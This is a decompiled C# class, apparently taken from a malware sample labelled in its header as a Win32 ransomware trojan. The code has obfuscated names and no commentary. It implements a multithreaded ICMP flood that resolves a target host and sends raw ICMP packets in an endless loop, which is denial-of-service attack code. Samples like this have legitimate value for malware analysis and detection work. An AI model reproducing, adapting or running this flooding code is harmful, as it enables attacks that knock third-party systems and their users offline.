// Decompiled with JetBrains decompiler
// Type: 
// Assembly: audiohd, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B3C2E6D6-337D-408B-994E-703E532E1FED
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.PornoAsset.dkhr-b435741867a0fdbf28756592cb30b1bd1f0b2169008f656b542888b53198a9b8.exe

using System.Net;
using System.Net.Sockets;
using System.Threading;

internal sealed class \u0003
{
  private static ThreadStart[] \u0002;
  private static Thread[] \u0003;
  public static string \u0005;
  public static int \u0008;
  private static IPEndPoint \u0006;
  public static ushort bd;
  public static int bc;
  private static \u0003.\u0002[] P;
  public static int O;

  public static void \u0002()
  {
    try
    {
      \u0003.\u0006 = new IPEndPoint(Dns.GetHostEntry(\u0003.\u0005).AddressList[0], (int) \u0003.bd);
    }
    catch
    {
      \u0003.\u0006 = new IPEndPoint(IPAddress.Parse(\u0003.\u0005), (int) \u0003.bd);
    }
    \u0003.\u0003 = new Thread[\u0003.O];
    \u0003.\u0002 = new ThreadStart[\u0003.O];
    \u0003.P = new \u0003.\u0002[\u0003.O];
    for (int index = 0; index < \u0003.O; ++index)
    {
      \u0003.P[index] = new \u0003.\u0002(\u0003.\u0006, \u0003.\u0008, \u0003.bc);
      \u0003.\u0002[index] = new ThreadStart(\u0003.P[index].\u0002);
      \u0003.\u0003[index] = new Thread(\u0003.\u0002[index]);
      \u0003.\u0003[index].Start();
    }
  }

  public static void \u0003()
  {
    for (int index = 0; index < \u0003.O; ++index)
    {
      try
      {
        \u0003.\u0003[index].Suspend();
      }
      catch
      {
      }
    }
  }

  private sealed class \u0002
  {
    private int \u0002;
    private IPEndPoint \u0003;
    private int \u0005;
    private Socket[] \u0008;

    public \u0002(IPEndPoint _param1, int _param2, int _param3)
    {
      this.\u0003 = _param1;
      this.\u0002 = _param2;
      this.\u0005 = _param3;
    }

    public void \u0002()
    {
      while (true)
      {
        byte[] buffer = new byte[this.\u0005];
        try
        {
          this.\u0008 = new Socket[this.\u0002];
          for (int index = 0; index < this.\u0002; ++index)
          {
            this.\u0008[index] = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Icmp);
            this.\u0008[index].Blocking = false;
            this.\u0008[index].SendTo(buffer, (EndPoint) this.\u0003);
          }
          Thread.Sleep(100);
          for (int index = 0; index < this.\u0002; ++index)
          {
            if (this.\u0008[index].Connected)
              this.\u0008[index].Disconnect(false);
            this.\u0008[index].Close();
            this.\u0008[index] = (Socket) null;
          }
          this.\u0008 = (Socket[]) null;
        }
        catch
        {
          for (int index = 0; index < this.\u0002; ++index)
          {
            try
            {
              if (this.\u0008[index].Connected)
                this.\u0008[index].Disconnect(false);
              this.\u0008[index].Close();
              this.\u0008[index] = (Socket) null;
            }
            catch
            {
            }
          }
        }
      }
    }
  }
}
